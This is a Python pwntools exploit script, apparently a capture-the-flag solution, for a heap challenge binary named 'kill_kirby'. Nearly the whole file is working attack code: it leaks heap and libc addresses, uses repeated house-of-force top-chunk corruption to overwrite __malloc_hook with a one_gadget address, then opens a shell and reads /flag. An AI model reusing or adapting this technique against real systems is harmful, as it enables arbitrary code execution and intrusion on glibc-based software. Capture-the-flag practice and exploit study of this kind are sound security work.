#!/usr/bin/env python
#encoding: utf-8;

###########################################
# I checked if whether this exploit works
# on Linux 4.15.0-65-generic #74-Ubuntu SMP Tue Sep 17 17:06:04 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
###########################################



from pwn import *
import sys

FILENAME = "./kill_kirby"

rhp2 = {'host':"localhost",'port':12347}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

total_walk = 0
off_libc_arena = 0x3ebc40
off_free_hook = 0x3ed8e8
off_malloc_hook = 0x3ebc30
kirby_is_free = 0x602058

#constraints:
#0:rcx==NULL 1:[rsp+0x40]==NULL 2:[rsp+0x70]==NULL
onegadgets = [0x4f2c5,0x4f322,0x10a38c]
push_gad = 0x000a3f3f

def normal(conn,name,kill=False):
  global total_walk
  total_walk += 1
  conn.recvuntil("> ")
  conn.sendline("1")
  conn.recvuntil("> ")
  
  if total_walk%6==0 or total_walk%0xa==0:
    conn.sendline("2")
    normal(conn,name,kill)
    return
  
  if kill==True:
    conn.sendline("2")
    return
  conn.sendline("1")
  conn.recvuntil("> ")
  conn.send(name)

def big(conn,name,size):
  global total_walk
  while True:
    if (total_walk+1)%0xa!=0:
      normal(conn,"A",True)
    else:
      break
  total_walk+=1

  conn.recvuntil("> ")
  conn.sendline("1")
  conn.recvuntil("> ")
  conn.sendline("1")
  conn.recvuntil("> ")
  conn.sendline(str(size))
  conn.recvuntil("> ")
  conn.send(name)

def small(conn,name):
  global total_walk
  while True:
    if (total_walk+1)%0x6!=0:
      normal(conn,"A",True)
    else:
      break
  total_walk+=1

  conn.recvuntil("> ")
  conn.sendline("1")
  conn.recvuntil("> ")
  conn.sendline("1")
  conn.recvuntil("> ")
  conn.send(name)

def rename(conn,ix,name):
  conn.recvuntil("> ")
  conn.sendline("4")
  conn.recvuntil("> ")
  conn.sendline(str(ix))
  conn.recvuntil("> ")
  conn.send(name)

def showlist(conn):
  conn.recvuntil("> ")
  conn.sendline("2")

def delete(conn,ix):
  conn.recvuntil("> ")
  conn.sendline("3")
  conn.recvuntil("> ")
  conn.sendline(str(ix))


def exploit(conn):
  global total_walk
  global kirby_is_free

  #leak heap addr
  small(conn,"A"*8)#1
  normal(conn,"B"*8)#2
  rename(conn,1,"A"*0x50) #overwrite next size as side-effect
  showlist(conn)
  conn.recvuntil("A"*0x50)
  heap_addr = unpack(conn.recvuntil(" ")[:-1].ljust(8,'\x00'))
  print("heap_addr: "+hex(heap_addr))

  #prepare for leak of &main_arena+96
  small(conn,"C"*8)#3 #used to adjuscent name chunk with name chunk

  #house of force and make chunk around stdout
  small(conn,"D"*0x48+p64(0xffffffffffffffff))#4
  top = heap_addr+0x200+0x31 #top addr after malloc of kirby structure
  print("top: "+hex(top))
  print("req malloc size(usr): "+hex(0xffffffffffffffff+kirby_is_free-top-0x30))
  print("intended addr: "+hex(0xffffffffffffffff+kirby_is_free-top-0x30+top)+"\n")
  big(conn,"X",kirby_is_free-top-0x30)#5 #house of force(@stdint+0x8==sz)
  normal(conn,"A"*0x10)#6 #overwrite kirby_is_free(total_walk woudn't change)



  #back to valid heap area with house of force again
  small(conn,"D"*0x48+p64(0xffffffffff00001))#7
  top = 0x602140 + 0x30 #top addr after malloc of kirby structure
  print("top: "+hex(top))
  target_heap = heap_addr + 0x280
  print("target_heap: "+hex(target_heap))
  #big(conn,p8(0),top - target_heap + 0x20) #made mistake and waste 4days!!!!!!
  big(conn,"E"*8,target_heap - top + 0x20) #8
  
  #leak libc base
  normal(conn,"F"*8)#9
  small(conn,"G"*8)#10->9
  delete(conn,9)
  big(conn,"H"*8,0x450)#10 #this kirby's name chunk is next to name chunk of small kirby!!
  small(conn,"I"*8)#11->10 #avoid malloc_consolidate() and third house of force later
  delete(conn,10) #generate main_arena+96 in heap
  
  rename(conn,9,"K"*0x48+p64(0xffffffffffffffff)) #padding
  showlist(conn)
  conn.recvuntil("K"*0x48)
  conn.recv(8)
  main_arena = unpack(conn.recvuntil(" ")[:-1].ljust(8,'\x00'))-96
  print("[+]main_arena: "+hex(main_arena))
  libc_base = main_arena - off_libc_arena
  print("[+]libc_base: "+hex(libc_base))
  onegadget1 = onegadgets[1]+libc_base
  onegadget0 = onegadgets[0]+libc_base
  onegadget2 = onegadgets[2]+libc_base
  print("[+]onegadget1: "+hex(onegadget1))
  free_hook = off_free_hook + libc_base
  malloc_hook = off_malloc_hook + libc_base
  print("[+]free_hook: "+hex(free_hook))
  print("[+]malloc_hook: "+hex(malloc_hook)+"\n")

  rename(conn,9,"K"*0x48+p64(0x461)) #rewrite unsorted chunk's size into valid

  #consume unsorted chunk(sz==3e1)
  for i in range(0x3e1/(0x30+0x60) + 2):
    normal(conn,"+"*8)

  #overwrite malloc_hook with house of force
  rename(conn,10,"L"*0x48+p64(0xffffffffffffff01)) #overwrite top's size
  top = heap_addr + 0x8a0 #+ 0x30 #this time, kirby structure is pick up from remained unsorted
  print("top: "+hex(top))
  print("malloc req size(usr): "+hex(0xffffffffffffffff+free_hook-top-0x20))
  big(conn,"M"*8,malloc_hook - top - 0x20) #now top is on __malloc_hook

  #(now, the remain of unsorted(small) chunk is 0x40,
  # therefore, smallkirby chunk is pick up from small bin,
  # and name chunk is the very on malloc_hook!!!)
  small(conn,p64(onegadget2))

  #get the shell!
  conn.recvuntil("> ")
  conn.sendline("1")
  conn.recvuntil("> ")
  conn.sendline("1")
  sleep(1)
  conn.sendline("ls")
  sleep(2)
  conn.sendline("cat /flag")



if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

